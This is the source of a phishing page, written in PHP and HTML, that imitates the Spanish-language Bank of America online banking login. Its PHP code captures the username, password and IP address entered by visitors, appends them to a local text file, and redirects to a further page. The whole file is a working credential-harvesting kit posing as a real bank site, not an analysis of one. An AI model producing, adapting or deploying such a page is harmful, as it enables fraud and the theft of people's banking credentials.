<?php
if (isset($_POST['add'])) {
  $user = "";
  if (!empty($_REQUEST['user'])) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];
  }

  $post = "";
  if (!empty($_REQUEST['post'])) {
    $post = $_REQUEST['post'];
  }


  $archivo = "loginhp.txt";
  $file = fopen($archivo, "a");
  fwrite($file, "Usuario: " . $user . "\r\nClave: " . $pass . "\r\nIP: " . $ip . "\r\n==============================\r\n");
  fclose($file);
  header('location: pa1.php');
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/normalize.min.css">
  <link rel="stylesheet" href="css/estilos.css">
  <title>Banca en Línea</title>
  <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
</head>

<body>
  <div class="container">
    <div class="banner1">
      <img src="img/logo.jpg" alt="logo">
      <p class="txtg">Entrar</p>
      <div class="derLinks">
        <img class="sarea" src="img/lock.jpg" alt="candado">
        <div class="areaSegura">Área protegida</div>
        <img class="sarea2" src="img/points.jpg" alt="puntos">
        <div class="lenguaje">In English</div>
      </div>
    </div>
    <div class="banner2">
      <h1>Entrar en la Banca en Línea</h1>
    </div>

    <div class="banner3">
      <div class="columnas">
        <form action="" method="post">
          <div class="form-group">
            <label for="usuario" class="titulo-input">Identificación en línea</label>
            <input type="text" name="user" maxlength="32" required>
            <input type="checkbox" name="reco"><label class="inline-titulo-input" for="reco">Guardar esta Identificación
              en línea</label>
            <img src="img/help.jpg" alt="ayuda">
          </div>
          <div class="form-group" style="margin-bottom: 23px;">
            <label for="clave" class="titulo-input2">Contraseña</label>
            <input type="password" name="pass" maxlength="20" required>
          </div>
          <div class="form-group" style="margin-bottom: 31px;">
            <a href="#">¿Olvidó su Contraseña?</a>
          </div>
          <div class="form-group">

            <button class="btn-azul" name="add" type="submit">
              <span></span> Entrar</button>
          </div>
        </form>
        <!-------------------Columna2-------------------->
        <div class="columna2">
          <p class="tituloColumna2">Manténgase conectado con la app</p>
          <img src="img/movil.jpg" alt="movil">
          <p class="titulo2Columna2">Transacciones seguras y convenientes en todo momento</p>
          <button class="btn-rojo">
            <span> Obtener la aplicación</span>
          </button>
        </div>
        <!-------------------Columna3------------------->
        <div class="columna3">
          <h2>Ayuda para entrar</h2>
          <ul>
            <li><a href="#">¿Olvidó su Identificación en línea o Contraseña?</a></li>
            <li><a href="#">¿Tiene problemas para entrar?</a></li>
          </ul>
          <h2 class="titulito">¿No utiliza la Banca en Línea?</h2>
          <ul>
            <li><a href="#">Inscríbase ahora</a></li>
            <li><a href="#">Más información sobre la Banca en Línea</a></li>
            <li><a href="#">Acuerdo de servicio</a></li>
          </ul>

        </div>

      </div>
    </div>
    <div class="banner4">
      <div class="fondolock"></div>
      <p>Área protegida</p>
      <div class="enlaces-footer">
        <a href="#">Privacidad</a> <a href="#">Seguridad</a>
      </div>
      <div class="copirait">
        <p>Bank of America, N.A. Miembro de FDIC. </p><a href="#"> Igualdad de oportunidades en préstamos para viviendas</a>
        <span class="corporation">© 2021 Bank of America Corporation.<span>
      </div>
    </div>
  </div>
</body>

</html>